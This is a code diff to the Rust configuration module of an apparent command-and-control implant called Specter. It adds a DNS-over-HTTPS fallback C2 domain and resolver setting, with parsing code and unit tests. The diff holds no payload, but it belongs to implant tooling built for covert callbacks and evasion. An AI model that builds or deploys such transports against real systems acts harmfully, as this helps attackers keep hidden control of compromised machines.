@@ -2,6 +2,7 @@
 
 use std::ffi::{OsStr, OsString};
 
+use crate::doh_transport::DohProvider;
 use crate::error::SpecterError;
 
 /// Configuration for the Specter agent.
@@ -51,6 +52,18 @@ pub struct SpecterConfig {
     pub spawn64: Option<String>,
     /// Default 32-bit spawn process path for injection.
     pub spawn32: Option<String>,
+    /// Authoritative C2 domain for the DNS-over-HTTPS fallback transport.
+    ///
+    /// When set, the agent falls back to DoH if HTTP callbacks fail.  Must be
+    /// the zone served by the teamserver's DNS listener
+    /// (e.g. `"c2.example.com"`).  When `None`, DoH is disabled.
+    /// Configurable via `SPECTER_DOH_DOMAIN` / `--doh-domain`.
+    pub doh_domain: Option<String>,
+    /// DoH resolver to use when `doh_domain` is set.
+    ///
+    /// Defaults to Cloudflare (`1.1.1.1`).
+    /// Configurable via `SPECTER_DOH_PROVIDER` / `--doh-provider` (`cloudflare` or `google`).
+    pub doh_provider: DohProvider,
 }
 
 impl SpecterConfig {
@@ -101,11 +114,14 @@ impl SpecterConfig {
             "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
             "  --kill-date UNIX_TS      Exit after this Unix timestamp\n",
             "  --working-hours MASK     Working-hours bitmask advertised in init\n",
+            "  --doh-domain DOMAIN      C2 authoritative domain for DoH fallback\n",
+            "  --doh-provider NAME      DoH resolver: cloudflare (default) or google\n",
             "  -h, --help               Show this help text\n\n",
             "Environment:\n",
             "  SPECTER_CALLBACK_URL, SPECTER_INIT_SECRET, SPECTER_USER_AGENT,\n",
             "  SPECTER_SLEEP_DELAY_MS, SPECTER_SLEEP_JITTER, SPECTER_KILL_DATE,\n",
-            "  SPECTER_WORKING_HOURS, SPECTER_PINNED_CERT_PEM\n",
+            "  SPECTER_WORKING_HOURS, SPECTER_PINNED_CERT_PEM,\n",
+            "  SPECTER_DOH_DOMAIN, SPECTER_DOH_PROVIDER\n",
         )
     }
 
@@ -142,6 +158,13 @@ impl SpecterConfig {
                 }
                 Some("SPECTER_PINNED_CERT_PEM") => {
                     self.pinned_cert_pem = Some(parse_os_string(value, "SPECTER_PINNED_CERT_PEM")?);
+                }
+                Some("SPECTER_DOH_DOMAIN") => {
+                    self.doh_domain = Some(parse_os_string(value, "SPECTER_DOH_DOMAIN")?);
+                }
+                Some("SPECTER_DOH_PROVIDER") => {
+                    let s = parse_os_string(value, "SPECTER_DOH_PROVIDER")?;
+                    self.doh_provider = parse_doh_provider(&s, "SPECTER_DOH_PROVIDER")?;
                 }
                 _ => {}
             }
@@ -195,6 +218,10 @@ impl SpecterConfig {
                 "--working-hours" => {
                     self.working_hours = Some(parse_string_value(&value, flag)?);
                 }
+                "--doh-domain" => self.doh_domain = Some(value),
+                "--doh-provider" => {
+                    self.doh_provider = parse_doh_provider(&value, flag)?;
+                }
                 _ => return Err(SpecterError::Argument(format!("unknown argument {flag}"))),
             }
         }
@@ -229,7 +256,19 @@ impl Default for SpecterConfig {
             inject_spoof_addr: None,
             spawn64: None,
             spawn32: None,
+            doh_domain: None,
+            doh_provider: DohProvider::Cloudflare,
         }
+    }
+}
+
+fn parse_doh_provider(s: &str, key: &str) -> Result<DohProvider, SpecterError> {
+    match s {
+        "cloudflare" => Ok(DohProvider::Cloudflare),
+        "google" => Ok(DohProvider::Google),
+        _ => Err(SpecterError::Argument(format!(
+            "invalid value for {key}: {s:?} (expected \"cloudflare\" or \"google\")"
+        ))),
     }
 }
 
@@ -381,5 +420,55 @@ mod tests {
         let usage = SpecterConfig::usage();
         assert!(usage.contains("--callback-url"));
         assert!(usage.contains("SPECTER_CALLBACK_URL"));
+        assert!(usage.contains("--doh-domain"));
+        assert!(usage.contains("SPECTER_DOH_DOMAIN"));
+    }
+
+    #[test]
+    fn doh_domain_unset_by_default() {
+        let config = SpecterConfig::default();
+        assert!(config.doh_domain.is_none());
+        assert_eq!(config.doh_provider, DohProvider::Cloudflare);
+    }
+
+    #[test]
+    fn from_sources_applies_doh_domain_from_env() {
+        let config = SpecterConfig::from_sources(
+            ["specter"],
+            [
+                ("SPECTER_CALLBACK_URL", "https://teamserver.local/"),
+                ("SPECTER_DOH_DOMAIN", "c2.example.com"),
+                ("SPECTER_DOH_PROVIDER", "google"),
+            ],
+        )
+        .expect("config");
+
+        assert_eq!(config.doh_domain.as_deref(), Some("c2.example.com"));
+        assert_eq!(config.doh_provider, DohProvider::Google);
+    }
+
+    #[test]
+    fn from_sources_applies_doh_domain_from_cli() {
+        let config = SpecterConfig::from_sources(
+            ["specter", "--doh-domain", "c2.test.com", "--doh-provider", "cloudflare"],
+            std::iter::empty::<(&str, &str)>(),
+        )
+        .expect("config");
+
+        assert_eq!(config.doh_domain.as_deref(), Some("c2.test.com"));
+        assert_eq!(config.doh_provider, DohProvider::Cloudflare);
+    }
+
+    #[test]
+    fn from_sources_rejects_invalid_doh_provider() {
+        let error = SpecterConfig::from_sources(
+            ["specter", "--doh-provider", "fakeprovider"],
+            std::iter::empty::<(&str, &str)>(),
+        )
+        .expect_err("invalid provider should fail");
+        assert!(matches!(
+            error,
+            SpecterError::Argument(ref msg) if msg.contains("fakeprovider")
+        ));
     }
 }
